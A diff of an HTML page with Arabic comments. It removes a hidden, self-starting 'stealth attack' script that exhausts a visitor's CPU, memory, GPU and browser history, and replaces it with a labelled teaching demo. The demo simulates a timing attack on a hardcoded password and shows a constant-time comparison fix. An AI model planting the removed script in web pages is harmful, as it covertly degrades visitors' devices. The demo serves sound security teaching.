@@ -1,33 +1,156 @@
-<script>
-    function stealthAttack() {
-        // مصفوفة تراكمية مخفية لمنع المتصفح من تنظيف الذاكرة
-        let hiddenVault = [];
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Side-Channel Demo - للأغراض التعليمية فقط</title>
+</head>
+<body>
+    <h1>هجوم جانبي تعليمي: Timing Attack</h1>
+    <p>هذا الكود يوضح كيف يمكن استنتاج بيانات حساسة عبر قياس وقت التنفيذ</p>
+    
+    <div id="result" style="border:1px solid red; padding:10px; margin:10px"></div>
 
-        // استخدام setInterval بتوقيت متوسط (غير ملاحظ)
-        setInterval(() => {
-            // 1. استهلاك المعالج (CPU) بنسبة 40% تقريباً
-            // عمليات حسابية معقدة تجعل المعالج يعمل باستمرار دون توقف
-            for (let i = 0; i < 1500000; i++) {
-                let calc = Math.sqrt(Math.random() * Math.PI) / Math.sin(Math.random());
+    <script>
+        // تنبيه أخلاقي
+        console.log("%c⚠️ هذا الكود للأغراض التعليمية فقط. استخدامه على أنظمة لا تملكها غير قانوني ⚠️", "color: red; font-size: 16px");
+        
+        // ============================================
+        // الطريقة 1: هجوم زمني على مقارنة النصوص
+        // ============================================
+        
+        // تخيل أن هذه كلمة سر مخزنة على السيرفر (الضحية)
+        const SECRET_PASSWORD = "CyberSec2024!";
+        
+        // دالة تقارن كلمتين بطريقة غير آمنة (تتوقف عند أول اختلاف)
+        function insecureCompare(guess, secret) {
+            for (let i = 0; i < Math.min(guess.length, secret.length); i++) {
+                if (guess[i] !== secret[i]) {
+                    return false; // تتوقف فوراً عند أول حرف مختلف
+                }
             }
-
-            // 2. استنزاف الرام (RAM) ببطء شديد (تراكمي)
-            // في كل دورة، نضيف بيانات "ثقيلة" لا يستطيع المتصفح حذفها
-            hiddenVault.push(new Float64Array(500000).fill(Math.random()));
-
-            // 3. إرهاق كرت الشاشة (GPU) بعمليات "رسم وهمية" في الخلفية
-            // نقوم برسم عناصر شفافة تماماً (لا تراها الضحية) لكنها تستهلك موارد الجرافيك
-            let canvas = document.createElement('canvas');
-            let ctx = canvas.getContext('2d');
-            ctx.shadowBlur = 50;
-            ctx.shadowColor = "rgba(0,0,0,0)"; // شفافة تماماً
-            ctx.strokeText("Nawaf Cyber Academy Stealth Attack", 10, 10);
-
-            // 4. إغراق السجل (History API) لثقل التنقل في المتصفح
-            window.history.pushState(null, "", "?session=" + Math.random());
-
-        }, 300); // تكرار كل 300 مللي ثانية (توازن بين القوة والصمت)
-    }
-
-    window.onload = stealthAttack;
-</script>
+            return guess.length === secret.length;
+        }
+        
+        // دالة آمنة (مقاومة للهجمات الزمنية)
+        function secureCompare(guess, secret) {
+            let result = 0;
+            const maxLen = Math.max(guess.length, secret.length);
+            for (let i = 0; i < maxLen; i++) {
+                const guessChar = i < guess.length ? guess.charCodeAt(i) : 0;
+                const secretChar = i < secret.length ? secret.charCodeAt(i) : 0;
+                result |= guessChar ^ secretChar; // XOR تراكمي - وقت ثابت
+            }
+            return result === 0;
+        }
+        
+        // ============================================
+        // محاكاة هجوم تخمين كلمة السر عبر الزمن
+        // ============================================
+        
+        async function timingAttack() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = "🔍 جاري تنفيذ هجوم Timing Attack... (هذا محاكاة تعليمية)<br>";
+            
+            let leakedPassword = "";
+            const possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+            
+            for (let position = 0; position < 12; position++) {
+                let bestChar = "";
+                let maxTime = 0;
+                
+                // تخمين كل حرف ممكن
+                for (let char of possibleChars) {
+                    const guess = leakedPassword + char;
+                    let totalTime = 0;
+                    const attempts = 10; // عدد المحاولات لتقليل الضوضاء
+                    
+                    // قياس وقت المقارنة عدة مرات
+                    for (let attempt = 0; attempt < attempts; attempt++) {
+                        const start = performance.now();
+                        insecureCompare(guess, SECRET_PASSWORD);
+                        const end = performance.now();
+                        totalTime += (end - start);
+                    }
+                    
+                    const avgTime = totalTime / attempts;
+                    
+                    // الحرف الذي يأخذ أطول وقت هو الأرجح (لأنه طابق أحرفاً أكثر)
+                    if (avgTime > maxTime) {
+                        maxTime = avgTime;
+                        bestChar = char;
+                    }
+                    
+                    resultDiv.innerHTML += `الموضع ${position}: تخمين "${char}" → وقت ${avgTime.toFixed(3)}ms<br>`;
+                }
+                
+                if (bestChar) {
+                    leakedPassword += bestChar;
+                    resultDiv.innerHTML += `<strong>✅ تم تخمين الحرف ${position}: "${bestChar}" → الكلمة الآن: ${leakedPassword}</strong><br>`;
+                }
+            }
+            
+            resultDiv.innerHTML += `<hr><strong style="color:red;">🎯 تم تسريب كلمة السر: ${leakedPassword}</strong><br>`;
+            resultDiv.innerHTML += `الكلمة الحقيقية: ${SECRET_PASSWORD}<br>`;
+            resultDiv.innerHTML += `النجاح: ${leakedPassword === SECRET_PASSWORD ? '✅ نعم' : '❌ لا (قد تحتاج محاولات أكثر)'}<br>`;
+        }
+        
+        // ============================================
+        // الطريقة 2: هجوم عبر ذاكرة التخزين المؤقت (Cache Attack)
+        // ============================================
+        
+        // محاكاة صفيف كبير من البيانات (ذاكرة التخزين)
+        const bigData = new Array(1000000).fill(0).map((_, i) => i);
+        
+        // دالة حساسة تصل إلى بيانات بناءً على إدخال المستخدم
+        function sensitiveOperation(userId) {
+            // الوصول إلى عنصر عشوائي في الذاكرة
+            return bigData[userId % bigData.length];
+        }
+        
+        // قياس وقت الوصول للذاكرة (مؤشر على ما إذا كانت البيانات مخزنة مؤقتاً)
+        function cacheTimingAttack() {
+            console.log("\n🔍 هجوم Cache Timing (مبدأ Spectre المبسط)");
+            console.log("قياس وقت الوصول لأنماط مختلفة من الذاكرة...");
+            
+            const indices = [10, 100, 1000, 10000, 100000];
+            
+            for (let idx of indices) {
+                // أول وصول (قد يكون بطيئاً)
+                const start1 = performance.now();
+                sensitiveOperation(idx);
+                const time1 = performance.now() - start1;
+                
+                // وصول ثانٍ (قد يكون أسرع إذا كانت البيانات في الكاش)
+                const start2 = performance.now();
+                sensitiveOperation(idx);
+                const time2 = performance.now() - start2;
+                
+                console.log(`الرقم القياسي ${idx}: أول وصول ${time1.toFixed(3)}ms, ثاني وصول ${time2.toFixed(3)}ms, الفرق ${(time1-time2).toFixed(3)}ms`);
+            }
+        }
+        
+        // ============================================
+        // واجهة التحكم
+        // ============================================
+        
+        // إنشاء أزرار مع تأخير بسيط لتجنب تجميد الواجهة
+        setTimeout(() => {
+            const button = document.createElement('button');
+            button.textContent = '🚀 تشغيل Timing Attack (محاكاة)';
+            button.onclick = () => timingAttack().catch(console.error);
+            document.body.appendChild(button);
+            
+            const cacheButton = document.createElement('button');
+            cacheButton.textContent = '💾 تشغيل Cache Timing Attack';
+            cacheButton.onclick = () => cacheTimingAttack();
+            cacheButton.style.marginLeft = '10px';
+            document.body.appendChild(cacheButton);
+            
+            const warning = document.createElement('p');
+            warning.style.color = 'orange';
+            warning.innerHTML = '⚠️ <strong>ملاحظة أمنية:</strong> هذا الكود يشرح المبدأ فقط. في الهجمات الحقيقية، تحتاج لآلاف المحاولات وتقنيات متقدمة لتجاوز التشويش والضجيج.';
+            document.body.appendChild(warning);
+            
+        }, 100);
+    </script>
+</body>
+</html>
